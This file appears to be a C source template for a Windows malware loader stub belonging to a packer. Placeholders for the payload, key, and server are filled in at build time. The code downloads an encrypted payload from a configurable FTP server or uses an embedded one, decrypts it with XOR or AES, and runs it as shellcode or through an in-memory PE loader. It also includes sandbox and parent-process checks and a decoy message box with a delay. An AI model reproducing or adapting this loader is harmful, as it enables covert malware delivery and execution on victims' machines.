#include <windows.h>
#include <wininet.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <bcrypt.h>
#include <stdio.h>
#include <string.h>

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "user32.lib")

// Forward declarations
int DL();
BOOL RunPE(unsigned char *pExeBuffer, size_t nSize);

unsigned char payload[] = { {{PAYLOAD_ARRAY}} };
size_t payload_len = {{PAYLOAD_SIZE}};
char key[] = {{KEY}};
char enc_algo[] = {{ENC_ALGO}};
char payload_type[] = {{PAYLOAD_TYPE}};
char FTP_USER[] = "{{FTP_USER}}";
char FTP_PASS[] = "{{FTP_PASS}}";

wchar_t PROTOCOL[10];
wchar_t IP[50];
short PORT;
wchar_t PATH[100];

unsigned char *{{BUF_NAME}} = NULL;
size_t {{SIZE_NAME}} = 0;
int {{CAPACITY_NAME}} = 0;

// {{JUNK}}
int is_sandbox_user() {
    char username[256] = {0};
    DWORD size = sizeof(username);
    GetUserNameA(username, &size);
    return (strstr(username, "sandbox") || strstr(username, "admin") || strstr(username, "test")) ? 1 : 0;
}

int check_parent() {
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 pe32 = { sizeof(PROCESSENTRY32) };
    DWORD ppid = 0, mypid = GetCurrentProcessId();
    if (Process32First(hSnap, &pe32)) {
        do {
            if (pe32.th32ProcessID == mypid) {
                ppid = pe32.th32ParentProcessID;
                break;
            }
        } while (Process32Next(hSnap, &pe32));
    }
    CloseHandle(hSnap);
    HANDLE hParent = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, ppid);
    CHAR parentName[MAX_PATH] = "";
    if (hParent) {
        HMODULE hMod;
        DWORD cbNeeded;
        if (EnumProcessModules(hParent, &hMod, sizeof(hMod), &cbNeeded))
            GetModuleBaseNameA(hParent, hMod, parentName, sizeof(parentName));
        CloseHandle(hParent);
    }
    return _stricmp(parentName, "explorer.exe") != 0;
}

void noise() {
    WIN32_FIND_DATA findData;
    HANDLE hFind = FindFirstFileA("C:\\Windows\\*", &findData);
    int count = 0;
    if (hFind != INVALID_HANDLE_VALUE) {
        do { if (++count > 10) break; } while (FindNextFileA(hFind, &findData));
        FindClose(hFind);
    }
}

void decrypt_payload(unsigned char *data, size_t data_len) {
    printf("[*] Starting decryption using %s\n", enc_algo);
    if (strcmp(enc_algo, "xor") == 0) {
        for (size_t i = 0; i < data_len; i++)
            data[i] ^= key[i % strlen(key)];
    } else if (strcmp(enc_algo, "aes") == 0) {
        BCRYPT_ALG_HANDLE hAlg = NULL;
        BCRYPT_KEY_HANDLE hKey = NULL;
        DWORD cbKeyObj = 0, cbData = 0;
        PUCHAR pbKeyObj = NULL;
        UCHAR rgbIV[16] = {0};
        UCHAR keyMaterial[16] = {0};
        memcpy(keyMaterial, key, min(strlen(key), 16));

        if (BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0)) { printf("[!] BCryptOpenAlgorithmProvider failed.\n"); return; }
        if (BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0)) { printf("[!] BCryptSetProperty failed.\n"); return; }
        if (BCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH, (PUCHAR)&cbKeyObj, sizeof(DWORD), &cbData, 0)) { printf("[!] BCryptGetProperty failed.\n"); return; }
        pbKeyObj = (PUCHAR)HeapAlloc(GetProcessHeap(), 0, cbKeyObj);
        if (!pbKeyObj) { printf("[!] HeapAlloc failed.\n"); return; }
        if (BCryptGenerateSymmetricKey(hAlg, &hKey, pbKeyObj, cbKeyObj, keyMaterial, 16, 0)) { printf("[!] BCryptGenerateSymmetricKey failed.\n"); return; }
        ULONG outLen = 0;
        if (BCryptDecrypt(hKey, data, (ULONG)data_len, NULL, rgbIV, 16, data, (ULONG)data_len, &outLen, 0)) { printf("[!] BCryptDecrypt failed.\n"); return; }
        printf("[*] AES decryption successful.\n");
        if (hKey) BCryptDestroyKey(hKey);
        if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
        if (pbKeyObj) HeapFree(GetProcessHeap(), 0, pbKeyObj);
    }
}

int DL() {
    printf("[*] Inside DL() FTP downloader\n");
    HMODULE hWinInet = LoadLibraryA("wininet.dll");
    if (!hWinInet) return 0;

    typedef HINTERNET(WINAPI *pInternetOpenA)(LPCSTR, DWORD, LPCSTR, LPCSTR, DWORD);
    typedef HINTERNET(WINAPI *pInternetConnectA)(HINTERNET, LPCSTR, INTERNET_PORT, LPCSTR, LPCSTR, DWORD, DWORD, DWORD_PTR);
    typedef HINTERNET(WINAPI *pFtpOpenFileA)(HINTERNET, LPCSTR, DWORD, DWORD, DWORD_PTR);
    typedef BOOL(WINAPI *pInternetReadFile)(HINTERNET, LPVOID, DWORD, LPDWORD);
    typedef BOOL(WINAPI *pInternetCloseHandle)(HINTERNET);

    pInternetOpenA InternetOpenA_ = (pInternetOpenA)GetProcAddress(hWinInet, "InternetOpenA");
    pInternetConnectA InternetConnectA_ = (pInternetConnectA)GetProcAddress(hWinInet, "InternetConnectA");
    pFtpOpenFileA FtpOpenFileA_ = (pFtpOpenFileA)GetProcAddress(hWinInet, "FtpOpenFileA");
    pInternetReadFile InternetReadFile_ = (pInternetReadFile)GetProcAddress(hWinInet, "InternetReadFile");
    pInternetCloseHandle InternetCloseHandle_ = (pInternetCloseHandle)GetProcAddress(hWinInet, "InternetCloseHandle");

    char ipA[100], pathA[100];
    wcstombs(ipA, IP, sizeof(ipA));
    wcstombs(pathA, PATH, sizeof(pathA));

    HINTERNET hInternet = InternetOpenA_("MyFTPStub/1.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) return 0;

    HINTERNET hFtp = InternetConnectA_(hInternet, ipA, INTERNET_DEFAULT_FTP_PORT, FTP_USER, FTP_PASS, INTERNET_SERVICE_FTP, INTERNET_FLAG_PASSIVE, 0);
    if (!hFtp) { InternetCloseHandle_(hInternet); return 0; }

    HINTERNET hFile = FtpOpenFileA_(hFtp, pathA, GENERIC_READ, FTP_TRANSFER_TYPE_BINARY, 0);
    if (!hFile) { InternetCloseHandle_(hFtp); InternetCloseHandle_(hInternet); return 0; }

    unsigned char tempBuf[4096]; DWORD bytesRead = 0;
    {{SIZE_NAME}} = {{CAPACITY_NAME}} = 0;

    while (InternetReadFile_(hFile, tempBuf, sizeof(tempBuf), &bytesRead) && bytesRead > 0) {
        if ({{SIZE_NAME}} + bytesRead > {{CAPACITY_NAME}}) {
            {{CAPACITY_NAME}} = ({{CAPACITY_NAME}} == 0) ? 8192 : {{CAPACITY_NAME}} * 2;
            {{BUF_NAME}} = (unsigned char*)realloc({{BUF_NAME}}, {{CAPACITY_NAME}});
            if (!{{BUF_NAME}}) { InternetCloseHandle_(hFile); InternetCloseHandle_(hFtp); InternetCloseHandle_(hInternet); return 0; }
        }
        memcpy({{BUF_NAME}} + {{SIZE_NAME}}, tempBuf, bytesRead);
        {{SIZE_NAME}} += bytesRead;
    }

    InternetCloseHandle_(hFile); InternetCloseHandle_(hFtp); InternetCloseHandle_(hInternet);
    printf("[*] FTP download completed successfully\n");
    return 1;
}

BOOL RunPE(unsigned char *pExeBuffer, size_t nSize) {
    printf("[*] Inside RunPE()\n");
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pExeBuffer;
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pExeBuffer + pDos->e_lfanew);
    LPVOID pImage = VirtualAlloc(NULL, pNt->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!pImage) return FALSE;
    memcpy(pImage, pExeBuffer, pNt->OptionalHeader.SizeOfHeaders);
    PIMAGE_SECTION_HEADER pSection = (PIMAGE_SECTION_HEADER)(pNt + 1);
    for (int i = 0; i < pNt->FileHeader.NumberOfSections; i++, pSection++) {
        memcpy((BYTE*)pImage + pSection->VirtualAddress, pExeBuffer + pSection->PointerToRawData, pSection->SizeOfRawData);
    }
    ULONG_PTR delta = (ULONG_PTR)pImage - pNt->OptionalHeader.ImageBase;
    if (delta) {
        PIMAGE_BASE_RELOCATION pReloc = (PIMAGE_BASE_RELOCATION)((BYTE*)pImage +
            pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
        DWORD relocSize = pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;
        DWORD parsed = 0;
        while (parsed < relocSize) {
            DWORD count = (pReloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
            WORD *pRelInfo = (WORD*)(pReloc + 1);
            for (DWORD j = 0; j < count; j++) {
                if (pRelInfo[j] >> 12 == IMAGE_REL_BASED_HIGHLOW) {
                    PDWORD pPatch = (PDWORD)((BYTE*)pImage + pReloc->VirtualAddress + (pRelInfo[j] & 0xFFF));
                    *pPatch += (DWORD)delta;
                }
            }
            parsed += pReloc->SizeOfBlock;
            pReloc = (PIMAGE_BASE_RELOCATION)((BYTE*)pReloc + pReloc->SizeOfBlock);
        }
    }
    PIMAGE_DATA_DIRECTORY pImportDir = &pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    if (pImportDir->Size) {
        PIMAGE_IMPORT_DESCRIPTOR pImportDesc = (PIMAGE_IMPORT_DESCRIPTOR)((BYTE*)pImage + pImportDir->VirtualAddress);
        for (; pImportDesc->Name; pImportDesc++) {
            char *szMod = (char*)((BYTE*)pImage + pImportDesc->Name);
            HMODULE hMod = LoadLibraryA(szMod);
            PIMAGE_THUNK_DATA pThunk = (PIMAGE_THUNK_DATA)((BYTE*)pImage + pImportDesc->FirstThunk);
            for (; pThunk->u1.Function; pThunk++) {
                FARPROC *pFunc = (FARPROC*)&pThunk->u1.Function;
                if (pThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG) {
                    *pFunc = GetProcAddress(hMod, (LPCSTR)(pThunk->u1.Ordinal & 0xFFFF));
                } else {
                    PIMAGE_IMPORT_BY_NAME pByName = (PIMAGE_IMPORT_BY_NAME)((BYTE*)pImage + pThunk->u1.AddressOfData);
                    *pFunc = GetProcAddress(hMod, pByName->Name);
                }
            }
        }
    }
    DWORD entryRVA = pNt->OptionalHeader.AddressOfEntryPoint;
    LPTHREAD_START_ROUTINE pEntry = (LPTHREAD_START_ROUTINE)((BYTE*)pImage + entryRVA);
    HANDLE hThread = CreateThread(NULL, 0, pEntry, NULL, 0, NULL);
    WaitForSingleObject(hThread, INFINITE);
    return TRUE;
}

int main() {
    printf("[*] Stub starting...\n");
    wcscpy(PROTOCOL, L"{{PROTOCOL}}");
    wcscpy(IP, L"{{IP}}");
    PORT = {{PORT}};
    wcscpy(PATH, L"{{PATH}}");

    printf("[*] Payload type: %s\n", payload_type);
    printf("[*] Encryption algorithm: %s\n", enc_algo);
    if (wcslen(IP) > 0) printf("[*] FTP staging enabled: %ls\n", IP);

    MessageBoxA(NULL, "Thanks for playing!", "MyPacker", MB_OK | MB_ICONINFORMATION);
    printf("[*] MessageBox shown.\n");

    Sleep(10000);
    printf("[*] Post splash delay complete.\n");

    unsigned char *final_payload = NULL;
    size_t final_size = 0;

    if (wcslen(IP) > 0) {
        printf("[*] Downloading payload from FTP server...\n");
        if (!DL()) { printf("[!] FTP download failed.\n"); return -1; }
        final_payload = {{BUF_NAME}};
        final_size = {{SIZE_NAME}};
        printf("[*] Download complete: %zu bytes\n", final_size);
    } else {
        final_payload = payload;
        final_size = payload_len;
        printf("[*] Using embedded payload: %zu bytes\n", final_size);
    }

    decrypt_payload(final_payload, final_size);

    printf("[*] Post-decryption first 4 bytes: 0x%02x 0x%02x 0x%02x 0x%02x\n",
        final_payload[0], final_payload[1], final_payload[2], final_payload[3]);

    if (!strcmp(payload_type, "shellcode")) {
        printf("[*] Executing as shellcode...\n");
        LPVOID exec = VirtualAlloc(NULL, final_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        memcpy(exec, final_payload, final_size);
        HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)exec, NULL, 0, NULL);
        WaitForSingleObject(hThread, INFINITE);
    } else if (!strcmp(payload_type, "exe")) {
        printf("[*] Executing as RunPE...\n");
        BOOL result = RunPE(final_payload, final_size);
        if (result) {
            printf("[*] RunPE successful.\n");
        } else {
            printf("[!] RunPE failed.\n");
        }
    }

    printf("[*] Stub exiting cleanly.\n");
    return 0;
}
